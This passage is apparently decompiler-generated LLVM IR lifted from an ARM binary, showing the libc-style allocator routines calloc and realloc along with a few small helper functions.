  uselistorder label %.thread30, { 1, 0 }
  uselistorder label %dec_label_pc_136fc, { 0, 2, 1 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %bb147, { 1, 0 }
  uselistorder label %dec_label_pc_13650, { 1, 0 }
  uselistorder label %dec_label_pc_13658.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1361c, { 1, 0 }
  uselistorder label %dec_label_pc_135d0, { 1, 0 }
  uselistorder label %dec_label_pc_13564, { 1, 0 }
  uselistorder label %dec_label_pc_13560, { 1, 0 }
  uselistorder label %dec_label_pc_1350c, { 1, 0 }
  uselistorder label %dec_label_pc_134f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_134c0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_134ac, { 1, 0 }
  uselistorder label %bb143, { 1, 0 }
  uselistorder label %bb141, { 1, 0 }
}

define i32 @function_13b80(i32 %arg1) local_unnamed_addr {
dec_label_pc_13b80:
  %v0_13b80 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13b80, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_13b80
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_13b80, %bb
  %v4_13b9c = phi i32 [ %arg1, %dec_label_pc_13b80 ], [ 0, %bb ]
  ret i32 %v4_13b9c

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_13ba0 = load i32, i32* @r4, align 4
  %v6_13ba0 = load i32, i32* @r5, align 4
  %v9_13ba0 = load i32, i32* @r6, align 4
  %v12_13ba0 = load i32, i32* @lr, align 4
  %v2_13ba8 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* @r5, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_13bb8 = mul i32 %arg2, %arg1
  store i32 %v2_13bb8, i32* @r6, align 4
  br i1 %v2_13ba8, label %dec_label_pc_13bf0, label %dec_label_pc_13bc0

dec_label_pc_13bc0:                               ; preds = %entry
  store i32 %arg1, i32* @r1, align 4
  %v2_13bc8 = udiv i32 %v2_13bb8, %arg1
  %v9_13bcc = icmp eq i32 %v2_13bc8, %arg2
  br i1 %v9_13bcc, label %dec_label_pc_13bf0, label %dec_label_pc_13bd4

dec_label_pc_13bd4:                               ; preds = %dec_label_pc_13bc0
  %v0_13bd8 = call i32 @__aeabi_read_tp()
  %v3_13bdc = load i16, i16* @global_var_23068.363, align 2
  %v4_13bdc = sext i16 %v3_13bdc to i32
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_13be8 = add i32 %v4_13bdc, %v0_13bd8
  %v4_13be8 = inttoptr i32 %v3_13be8 to i32*
  store i32 12, i32* %v4_13be8, align 4
  br label %dec_label_pc_13cb4

dec_label_pc_13bf0:                               ; preds = %dec_label_pc_13bc0, %entry
  %v4_13bf4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 108) to i32*), align 4
  store i32 %v4_13bf4, i32* @r4, align 4
  %v4_13c0c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 112) to i32*), align 4
  store i32 %v4_13c0c, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13c0c)
  %v0_13c20 = load i32, i32* @r5, align 4
  %v2_13c20 = add i32 %v0_13c20, 16
  %v3_13c20 = inttoptr i32 %v2_13c20 to i32*
  %v4_13c20 = load i32, i32* %v3_13c20, align 4
  store i32 %v4_13c20, i32* %ip.global-to-local, align 4
  store i32 80940, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13c20)
  %v0_13c2c = load i32, i32* @r6, align 4
  store i32 %v0_13c2c, i32* @r0, align 4
  %v0_13c30 = call i32 @malloc()
  store i32 %v0_13c30, i32* %r4.global-to-local, align 4
  %v2_13c34 = icmp eq i32 %v0_13c30, 0
  br i1 %v2_13c34, label %.thread, label %dec_label_pc_13c3c

dec_label_pc_13c3c:                               ; preds = %dec_label_pc_13bf0
  %v1_13c3c = add i32 %v0_13c30, -4
  %v2_13c3c = inttoptr i32 %v1_13c3c to i32*
  %v3_13c3c = load i32, i32* %v2_13c3c, align 4
  %v1_13c40 = and i32 %v3_13c3c, 2
  %v2_13c40 = icmp eq i32 %v1_13c40, 0
  br i1 %v2_13c40, label %dec_label_pc_13c48, label %.thread

dec_label_pc_13c48:                               ; preds = %dec_label_pc_13c3c
  %v1_13c486 = add i32 %v3_13c3c, -4
  %v1_13c4c = and i32 %v1_13c486, -4
  %v3_13c50 = udiv i32 %v1_13c4c, 4
  store i32 %v3_13c50, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_13c4c, 36
  %v2_13c58 = icmp ult i32 %v1_13c4c, 33
  %v3_13c58 = or i1 %tmp, %v2_13c58
  br i1 %v3_13c58, label %dec_label_pc_13c64, label %dec_label_pc_13c5c

dec_label_pc_13c5c:                               ; preds = %dec_label_pc_13c48
  %v3_13c5c = inttoptr i32 %v0_13c30 to i8*
  %v4_13c5c = call i32 @__GI_memset(i8* %v3_13c5c, i32 0, i32 %v1_13c4c)
  br label %.thread

dec_label_pc_13c64:                               ; preds = %dec_label_pc_13c48
  %tmp7 = icmp eq i32 %v1_13c4c, 16
  %v2_13c68 = inttoptr i32 %v0_13c30 to i32*
  store i32 0, i32* %v2_13c68, align 4
  %v1_13c6c = load i32, i32* %r4.global-to-local, align 4
  %v2_13c6c = add i32 %v1_13c6c, 4
  %v3_13c6c = inttoptr i32 %v2_13c6c to i32*
  store i32 0, i32* %v3_13c6c, align 4
  %v1_13c70 = load i32, i32* %r4.global-to-local, align 4
  %v2_13c70 = add i32 %v1_13c70, 8
  %v3_13c70 = inttoptr i32 %v2_13c70 to i32*
  store i32 0, i32* %v3_13c70, align 4
  %v2_13c74 = icmp ult i32 %v1_13c4c, 13
  %v3_13c74 = or i1 %tmp7, %v2_13c74
  br i1 %v3_13c74, label %.thread, label %dec_label_pc_13c78

dec_label_pc_13c78:                               ; preds = %dec_label_pc_13c64
  %v0_13c78 = load i32, i32* %ip.global-to-local, align 4
  %v1_13c7c = load i32, i32* %r4.global-to-local, align 4
  %v2_13c7c = add i32 %v1_13c7c, 12
  %v3_13c7c = inttoptr i32 %v2_13c7c to i32*
  store i32 0, i32* %v3_13c7c, align 4
  %v1_13c80 = load i32, i32* %r4.global-to-local, align 4
  %v2_13c80 = add i32 %v1_13c80, 16
  %v3_13c80 = inttoptr i32 %v2_13c80 to i32*
  store i32 0, i32* %v3_13c80, align 4
  %tmp8 = icmp ult i32 %v0_13c78, 7
  br i1 %tmp8, label %.thread, label %dec_label_pc_13c88

dec_label_pc_13c88:                               ; preds = %dec_label_pc_13c78
  %v0_13c88 = load i32, i32* %ip.global-to-local, align 4
  %v7_13c88 = icmp eq i32 %v0_13c88, 9
  %v1_13c8c = load i32, i32* %r4.global-to-local, align 4
  %v2_13c8c = add i32 %v1_13c8c, 20
  %v3_13c8c = inttoptr i32 %v2_13c8c to i32*
  store i32 0, i32* %v3_13c8c, align 4
  %v1_13c90 = load i32, i32* %r4.global-to-local, align 4
  %v2_13c90 = add i32 %v1_13c90, 24
  %v3_13c90 = inttoptr i32 %v2_13c90 to i32*
  store i32 0, i32* %v3_13c90, align 4
  br i1 %v7_13c88, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13c88
  %v2_13c94 = load i32, i32* %r4.global-to-local, align 4
  %v3_13c94 = add i32 %v2_13c94, 32
  %v4_13c94 = inttoptr i32 %v3_13c94 to i32*
  store i32 0, i32* %v4_13c94, align 4
  %v2_13c98 = load i32, i32* %r4.global-to-local, align 4
  %v3_13c98 = add i32 %v2_13c98, 28
  %v4_13c98 = inttoptr i32 %v3_13c98 to i32*
  store i32 0, i32* %v4_13c98, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13c88, %dec_label_pc_13c3c, %dec_label_pc_13c78, %dec_label_pc_13c64, %dec_label_pc_13bf0, %dec_label_pc_13c5c, %bb
  store i32 1, i32* @r1, align 4
  %v0_13ca8 = load i32, i32* @r5, align 4
  %v2_13ca8 = add i32 %v0_13ca8, 44
  %v3_13ca8 = inttoptr i32 %v2_13ca8 to i32*
  %v4_13ca8 = load i32, i32* %v3_13ca8, align 4
  store i32 %v4_13ca8, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13ca8)
  br label %dec_label_pc_13cb4

dec_label_pc_13cb4:                               ; preds = %dec_label_pc_13bd4, %.thread
  %v0_13cb4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_13ba0, i32* @r4, align 4
  store i32 %v6_13ba0, i32* @r5, align 4
  store i32 %v9_13ba0, i32* @r6, align 4
  store i32 %v12_13ba0, i32* @lr, align 4
  ret i32 %v0_13cb4

; uselistorder directives
  uselistorder i32 %v1_13c4c, { 0, 5, 2, 1, 4, 3 }
  uselistorder i32 %v0_13c30, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 33, { 0, 6, 5, 7, 1, 2, 3, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_13cb4, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @function_13ccc(i32 %arg1) local_unnamed_addr {
dec_label_pc_13ccc:
  %v0_13ccc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13ccc, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_13ccc
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_13ccc, %bb
  %v4_13cdc = phi i32 [ %arg1, %dec_label_pc_13ccc ], [ 0, %bb ]
  ret i32 %v4_13cdc

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_13ce0 = load i32, i32* @r4, align 4
  %v6_13ce0 = load i32, i32* @r5, align 4
  %v9_13ce0 = load i32, i32* @r6, align 4
  %v12_13ce0 = load i32, i32* @r7, align 4
  %v15_13ce0 = load i32, i32* @r8, align 4
  %v18_13ce0 = load i32, i32* @sb, align 4
  %v21_13ce0 = load i32, i32* @sl, align 4
  %v24_13ce0 = load i32, i32* @fp, align 4
  %v27_13ce0 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_13cec = icmp eq i32* %arg1, null
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_13cec, label %dec_label_pc_13d00, label %dec_label_pc_13d10

dec_label_pc_13d00:                               ; preds = %entry
  store i32 %arg2, i32* @r0, align 4
  %v0_13d04 = call i32 @malloc()
  store i32 %v0_13d04, i32* %r0.global-to-local, align 4
  store i32 %v0_13d04, i32* @r4, align 4
  br label %dec_label_pc_14070

dec_label_pc_13d10:                               ; preds = %entry
  %v2_13d10 = icmp eq i32 %arg2, 0
  br i1 %v2_13d10, label %dec_label_pc_13d18, label %dec_label_pc_13d24

dec_label_pc_13d18:                               ; preds = %dec_label_pc_13d10
  %v0_13d18 = call i32 @free()
  store i32 %v0_13d18, i32* %r0.global-to-local, align 4
  %v0_13d1c = load i32, i32* @r6, align 4
  store i32 %v0_13d1c, i32* @r4, align 4
  br label %dec_label_pc_14070

dec_label_pc_13d24:                               ; preds = %dec_label_pc_13d10
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_13d2c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 108) to i32*), align 4
  store i32 %v4_13d2c, i32* @r4, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_13d2c, i32* %r2.global-to-local, align 4
  %v4_13d38 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 68) to i32*), align 4
  store i32 %v4_13d38, i32* %r1.global-to-local, align 4
  %v2_13d3c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_13d3c, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_13d44 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_13d44)
  %v0_13d50 = load i32, i32* @r4, align 4
  store i32 %v0_13d50, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %r1.global-to-local, align 4
  %v4_13d5c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 16) to i32*), align 4
  store i32 ptrtoint (i32* @global_var_13d68.466 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13d5c)
  %v0_13d68 = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_13d68, -32
  br i1 %tmp36, label %dec_label_pc_13d8c, label %dec_label_pc_13d70

dec_label_pc_13d70:                               ; preds = %dec_label_pc_13d24
  store i32 62184, i32* %r2.global-to-local, align 4
  %v0_13d74 = call i32 @__aeabi_read_tp()
  store i32 %v0_13d74, i32* %r0.global-to-local, align 4
  %v3_13d78 = load i16, i16* @global_var_23068.363, align 2
  %v4_13d78 = sext i16 %v3_13d78 to i32
  store i32 %v4_13d78, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_13d84 = add i32 %v4_13d78, %v0_13d74
  %v4_13d84 = inttoptr i32 %v3_13d84 to i32*
  store i32 12, i32* %v4_13d84, align 4
  br label %dec_label_pc_14070

dec_label_pc_13d8c:                               ; preds = %dec_label_pc_13d24
  %v1_13d8c = add i32 %v0_13d68, 11
  store i32 %v1_13d8c, i32* %r0.global-to-local, align 4
  %v0_13d90 = load i32, i32* @r5, align 4
  %v1_13d90 = add i32 %v0_13d90, -4
  %v2_13d90 = inttoptr i32 %v1_13d90 to i32*
  %v3_13d90 = load i32, i32* %v2_13d90, align 4
  store i32 %v3_13d90, i32* %r2.global-to-local, align 4
  %v2_13d94 = icmp ugt i32 %v1_13d8c, 14
  %v7_13d94 = icmp eq i32 %v1_13d8c, 15
  %v2_13d98 = xor i1 %v2_13d94, true
  %v3_13d98 = or i1 %v7_13d94, %v2_13d98
  br i1 %v3_13d98, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_13d8c
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_13d8c, %bb
  %v2_13d9c = xor i1 %v7_13d94, true
  %v3_13d9c = and i1 %v2_13d94, %v2_13d9c
  br i1 %v3_13d9c, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_13d9c = and i32 %v1_13d8c, -8
  store i32 %v5_13d9c, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_13da0 = and i32 %v3_13d90, 2
  %v2_13da0 = icmp eq i32 %v1_13da0, 0
  %v1_13da4 = add i32 %v0_13d90, -8
  store i32 %v1_13da4, i32* @sl, align 4
  %v1_13da8 = and i32 %v3_13d90, -4
  store i32 %v1_13da8, i32* @r6, align 4
  br i1 %v2_13da0, label %dec_label_pc_13db0, label %dec_label_pc_13f88

dec_label_pc_13db0:                               ; preds = %bb29
  %v1_13db0 = load i32, i32* @sb, align 4
  %v3_13db0 = icmp ult i32 %v1_13da8, %v1_13db0
  br i1 %v3_13db0, label %dec_label_pc_13dbc, label %bb30

bb30:                                             ; preds = %dec_label_pc_13db0
  store i32 %v1_13da8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13f20

dec_label_pc_13dbc:                               ; preds = %dec_label_pc_13db0
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_13dc4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 64) to i32*), align 4
  store i32 %v4_13dc4, i32* %r0.global-to-local, align 4
  %v1_13dc8 = add i32 %v4_13dc4, 44
  %v2_13dc8 = inttoptr i32 %v1_13dc8 to i32*
  %v3_13dc8 = load i32, i32* %v2_13dc8, align 4
  store i32 %v3_13dc8, i32* %r3.global-to-local, align 4
  %v2_13dcc = add i32 %v1_13da8, %v1_13da4
  store i32 %v2_13dcc, i32* @r4, align 4
  %v9_13dd0 = icmp eq i32 %v2_13dcc, %v3_13dc8
  %v1_13dd4 = add i32 %v2_13dcc, 4
  %v2_13dd4 = inttoptr i32 %v1_13dd4 to i32*
  %v3_13dd4 = load i32, i32* %v2_13dd4, align 4
  store i32 %v3_13dd4, i32* %r1.global-to-local, align 4
  br i1 %v9_13dd0, label %dec_label_pc_13ddc, label %dec_label_pc_13e18

dec_label_pc_13ddc:                               ; preds = %dec_label_pc_13dbc
  %v1_13ddc = and i32 %v3_13dd4, -4
  %v2_13de0 = add i32 %v1_13ddc, %v1_13da8
  store i32 %v2_13de0, i32* %r1.global-to-local, align 4
  %v1_13de4 = add i32 %v1_13db0, 16
  store i32 %v1_13de4, i32* %r3.global-to-local, align 4
  %v3_13de8 = icmp ult i32 %v2_13de0, %v1_13de4
  br i1 %v3_13de8, label %dec_label_pc_13e6c, label %dec_label_pc_13df0

dec_label_pc_13df0:                               ; preds = %dec_label_pc_13ddc
  %v2_13df0 = sub i32 %v2_13de0, %v1_13db0
  %v1_13df4 = urem i32 %v3_13d90, 2
  %v2_13df8 = add i32 %v1_13db0, %v1_13da4
  store i32 %v2_13df8, i32* %r1.global-to-local, align 4
  %v2_13dfc = or i32 %v1_13db0, %v1_13df4
  store i32 %v2_13dfc, i32* %r2.global-to-local, align 4
  %v1_13e00 = or i32 %v2_13df0, 1
  store i32 %v1_13e00, i32* %r3.global-to-local, align 4
  store i32 %v0_13d90, i32* @r4, align 4
  store i32 %v2_13dfc, i32* %v2_13d90, align 4
  %v0_13e0c = load i32, i32* %r1.global-to-local, align 4
  %v1_13e0c = load i32, i32* %r0.global-to-local, align 4
  %v2_13e0c = add i32 %v1_13e0c, 44
  %v3_13e0c = inttoptr i32 %v2_13e0c to i32*
  store i32 %v0_13e0c, i32* %v3_13e0c, align 4
  %v0_13e10 = load i32, i32* %r3.global-to-local, align 4
  %v1_13e10 = load i32, i32* %r1.global-to-local, align 4
  %v2_13e10 = add i32 %v1_13e10, 4
  %v3_13e10 = inttoptr i32 %v2_13e10 to i32*
  store i32 %v0_13e10, i32* %v3_13e10, align 4
  br label %dec_label_pc_14054

dec_label_pc_13e18:                               ; preds = %dec_label_pc_13dbc
  %v1_13e18 = and i32 %v3_13dd4, -2
  %v2_13e1c = add i32 %v1_13e18, %v2_13dcc
  store i32 %v2_13e1c, i32* %r3.global-to-local, align 4
  %v1_13e20 = add i32 %v2_13e1c, 4
  %v2_13e20 = inttoptr i32 %v1_13e20 to i32*
  %v3_13e20 = load i32, i32* %v2_13e20, align 4
  store i32 %v3_13e20, i32* %r3.global-to-local, align 4
  %v1_13e24 = urem i32 %v3_13e20, 2
  %v2_13e24 = icmp eq i32 %v1_13e24, 0
  br i1 %v2_13e24, label %dec_label_pc_13e2c, label %dec_label_pc_13e6c

dec_label_pc_13e2c:                               ; preds = %dec_label_pc_13e18
  %v1_13e2c = and i32 %v3_13dd4, -4
  store i32 %v1_13e2c, i32* %r3.global-to-local, align 4
  %v2_13e30 = add i32 %v1_13e2c, %v1_13da8
  store i32 %v2_13e30, i32* %r0.global-to-local, align 4
  %v3_13e34 = icmp ult i32 %v2_13e30, %v1_13db0
  br i1 %v3_13e34, label %dec_label_pc_13e6c, label %dec_label_pc_13e3c

dec_label_pc_13e3c:                               ; preds = %dec_label_pc_13e2c
  %v1_13e3c = add i32 %v1_13da8, %v0_13d90
  %v2_13e3c = inttoptr i32 %v1_13e3c to i32*
  %v3_13e3c = load i32, i32* %v2_13e3c, align 4
  store i32 %v3_13e3c, i32* %r1.global-to-local, align 4
  %v1_13e40 = add i32 %v3_13e3c, 12
  %v2_13e40 = inttoptr i32 %v1_13e40 to i32*
  %v3_13e40 = load i32, i32* %v2_13e40, align 4
  store i32 %v3_13e40, i32* %r3.global-to-local, align 4
  %v9_13e44 = icmp eq i32 %v3_13e40, %v2_13dcc
  %v1_13e48 = add i32 %v2_13dcc, 12
  %v2_13e48 = inttoptr i32 %v1_13e48 to i32*
  %v3_13e48 = load i32, i32* %v2_13e48, align 4
  store i32 %v3_13e48, i32* %r2.global-to-local, align 4
  br i1 %v9_13e44, label %dec_label_pc_13e50, label %dec_label_pc_13e5c

dec_label_pc_13e50:                               ; preds = %dec_label_pc_13e3c
  %v1_13e50 = add i32 %v3_13e48, 8
  %v2_13e50 = inttoptr i32 %v1_13e50 to i32*
  %v3_13e50 = load i32, i32* %v2_13e50, align 4
  store i32 %v3_13e50, i32* %r3.global-to-local, align 4
  %v9_13e54 = icmp eq i32 %v3_13e50, %v2_13dcc
  br i1 %v9_13e54, label %dec_label_pc_13e60, label %dec_label_pc_13e5c

dec_label_pc_13e5c:                               ; preds = %dec_label_pc_13e3c, %dec_label_pc_13e50
  %v0_13e5c = call i32 @abort()
  store i32 %v0_13e5c, i32* %r0.global-to-local, align 4
  %v0_13e60.pre = load i32, i32* @r1, align 4
  %v1_13e60.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_13e60

dec_label_pc_13e60:                               ; preds = %dec_label_pc_13e50, %dec_label_pc_13e5c
  %v1_13e60 = phi i32 [ %v3_13e48, %dec_label_pc_13e50 ], [ %v1_13e60.pre, %dec_label_pc_13e5c ]
  %v0_13e60 = phi i32 [ %v3_13e3c, %dec_label_pc_13e50 ], [ %v0_13e60.pre, %dec_label_pc_13e5c ]
  %v2_13e60 = add i32 %v1_13e60, 8
  %v3_13e60 = inttoptr i32 %v2_13e60 to i32*
  store i32 %v0_13e60, i32* %v3_13e60, align 4
  %v0_13e64 = load i32, i32* %r2.global-to-local, align 4
  %v1_13e64 = load i32, i32* %r1.global-to-local, align 4
  %v2_13e64 = add i32 %v1_13e64, 12
  %v3_13e64 = inttoptr i32 %v2_13e64 to i32*
  store i32 %v0_13e64, i32* %v3_13e64, align 4
  %v1_13f20.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13f20

dec_label_pc_13e6c:                               ; preds = %dec_label_pc_13ddc, %dec_label_pc_13e2c, %dec_label_pc_13e18
  %v1_13e6c = add i32 %v1_13db0, -7
  store i32 %v1_13e6c, i32* @r0, align 4
  %v0_13e70 = call i32 @malloc()
  store i32 %v0_13e70, i32* @r0, align 4
  store i32 %v0_13e70, i32* %r1.global-to-local, align 4
  %v2_13e74 = icmp eq i32 %v0_13e70, 0
  br i1 %v2_13e74, label %bb31, label %dec_label_pc_13e80

bb31:                                             ; preds = %dec_label_pc_13e6c
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_14054

dec_label_pc_13e80:                               ; preds = %dec_label_pc_13e6c
  %v1_13e88.pre = load i32, i32* @r4, align 4
  %v1_13e80 = add i32 %v0_13e70, -4
  %v2_13e80 = inttoptr i32 %v1_13e80 to i32*
  %v3_13e80 = load i32, i32* %v2_13e80, align 4
  store i32 %v3_13e80, i32* @r3, align 4
  %v1_13e84 = add i32 %v0_13e70, -8
  store i32 %v1_13e84, i32* @r7, align 4
  %v9_13e88 = icmp eq i32 %v1_13e84, %v1_13e88.pre
  br i1 %v9_13e88, label %.thread2, label %dec_label_pc_13e98

.thread2:                                         ; preds = %dec_label_pc_13e80
  %v2_13e8c = and i32 %v3_13e80, -4
  store i32 %v2_13e8c, i32* %r3.global-to-local, align 4
  %v2_13e90 = load i32, i32* @r6, align 4
  %v3_13e90 = add i32 %v2_13e90, %v2_13e8c
  store i32 %v3_13e90, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13f20

dec_label_pc_13e98:                               ; preds = %dec_label_pc_13e80
  %v0_13e98 = load i32, i32* @r6, align 4
  %v1_13e98 = add i32 %v0_13e98, -4
  store i32 %v1_13e98, i32* @r2, align 4
  %v3_13e9c = udiv i32 %v1_13e98, 4
  store i32 %v3_13e9c, i32* @ip, align 4
  %tmp37 = and i32 %v1_13e98, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_13ea4 = icmp ult i32 %v1_13e98, 36
  %v3_13ea4 = or i1 %tmp38, %v2_13ea4
  %v0_13eb4 = load i32, i32* @r5, align 4
  br i1 %v3_13ea4, label %dec_label_pc_13eb4, label %dec_label_pc_13ea8

dec_label_pc_13ea8:                               ; preds = %dec_label_pc_13e98
  store i32 %v0_13eb4, i32* @r1, align 4
  %v0_13eac = call i32 @memcpy()
  store i32 %v0_13eac, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_13eb4:                               ; preds = %dec_label_pc_13e98
  %v1_13eb4 = inttoptr i32 %v0_13eb4 to i32*
  %v2_13eb4 = load i32, i32* %v1_13eb4, align 4
  store i32 %v2_13eb4, i32* %r3.global-to-local, align 4
  %v2_13eb8 = inttoptr i32 %v0_13e70 to i32*
  store i32 %v2_13eb4, i32* %v2_13eb8, align 4
  %v0_13ebc = load i32, i32* @r5, align 4
  %v1_13ebc = add i32 %v0_13ebc, 4
  %v2_13ebc = inttoptr i32 %v1_13ebc to i32*
  %v3_13ebc = load i32, i32* %v2_13ebc, align 4
  store i32 %v3_13ebc, i32* %r3.global-to-local, align 4
  %v1_13ec0 = load i32, i32* %r1.global-to-local, align 4
  %v2_13ec0 = add i32 %v1_13ec0, 4
  %v3_13ec0 = inttoptr i32 %v2_13ec0 to i32*
  store i32 %v3_13ebc, i32* %v3_13ec0, align 4
  %v0_13ec4 = load i32, i32* @r5, align 4
  %v1_13ec4 = add i32 %v0_13ec4, 8
  %v2_13ec4 = inttoptr i32 %v1_13ec4 to i32*
  %v3_13ec4 = load i32, i32* %v2_13ec4, align 4
  store i32 %v3_13ec4, i32* %r3.global-to-local, align 4
  %v0_13ec8 = load i32, i32* @ip, align 4
  %v1_13ecc = load i32, i32* %r1.global-to-local, align 4
  %v2_13ecc = add i32 %v1_13ecc, 8
  %v3_13ecc = inttoptr i32 %v2_13ecc to i32*
  store i32 %v3_13ec4, i32* %v3_13ecc, align 4
  %tmp39 = icmp ult i32 %v0_13ec8, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_13ed4

dec_label_pc_13ed4:                               ; preds = %dec_label_pc_13eb4
  %v0_13ed4 = load i32, i32* @r5, align 4
  %v1_13ed4 = add i32 %v0_13ed4, 12
  %v2_13ed4 = inttoptr i32 %v1_13ed4 to i32*
  %v3_13ed4 = load i32, i32* %v2_13ed4, align 4
  store i32 %v3_13ed4, i32* %r3.global-to-local, align 4
  %v1_13ed8 = load i32, i32* %r1.global-to-local, align 4
  %v2_13ed8 = add i32 %v1_13ed8, 12
  %v3_13ed8 = inttoptr i32 %v2_13ed8 to i32*
  store i32 %v3_13ed4, i32* %v3_13ed8, align 4
  %v0_13edc = load i32, i32* @r5, align 4
  %v1_13edc = add i32 %v0_13edc, 16
  %v2_13edc = inttoptr i32 %v1_13edc to i32*
  %v3_13edc = load i32, i32* %v2_13edc, align 4
  store i32 %v3_13edc, i32* %r3.global-to-local, align 4
  %v0_13ee0 = load i32, i32* @ip, align 4
  %v1_13ee4 = load i32, i32* %r1.global-to-local, align 4
  %v2_13ee4 = add i32 %v1_13ee4, 16
  %v3_13ee4 = inttoptr i32 %v2_13ee4 to i32*
  store i32 %v3_13edc, i32* %v3_13ee4, align 4
  %tmp40 = icmp ult i32 %v0_13ee0, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_13eec

dec_label_pc_13eec:                               ; preds = %dec_label_pc_13ed4
  %v0_13eec = load i32, i32* @r5, align 4
  %v1_13eec = add i32 %v0_13eec, 20
  %v2_13eec = inttoptr i32 %v1_13eec to i32*
  %v3_13eec = load i32, i32* %v2_13eec, align 4
  store i32 %v3_13eec, i32* %r3.global-to-local, align 4
  %v1_13ef0 = load i32, i32* %r1.global-to-local, align 4
  %v2_13ef0 = add i32 %v1_13ef0, 20
  %v3_13ef0 = inttoptr i32 %v2_13ef0 to i32*
  store i32 %v3_13eec, i32* %v3_13ef0, align 4
  %v0_13ef4 = load i32, i32* @r5, align 4
  %v1_13ef4 = add i32 %v0_13ef4, 24
  %v2_13ef4 = inttoptr i32 %v1_13ef4 to i32*
  %v3_13ef4 = load i32, i32* %v2_13ef4, align 4
  store i32 %v3_13ef4, i32* %r3.global-to-local, align 4
  %v1_13ef8 = load i32, i32* %r1.global-to-local, align 4
  %v2_13ef8 = add i32 %v1_13ef8, 24
  %v3_13ef8 = inttoptr i32 %v2_13ef8 to i32*
  store i32 %v3_13ef4, i32* %v3_13ef8, align 4
  %v0_13efc = load i32, i32* @ip, align 4
  %v7_13efc = icmp eq i32 %v0_13efc, 9
  br i1 %v7_13efc, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_13eec
  %v1_13f00 = load i32, i32* @r5, align 4
  %v2_13f00 = add i32 %v1_13f00, 28
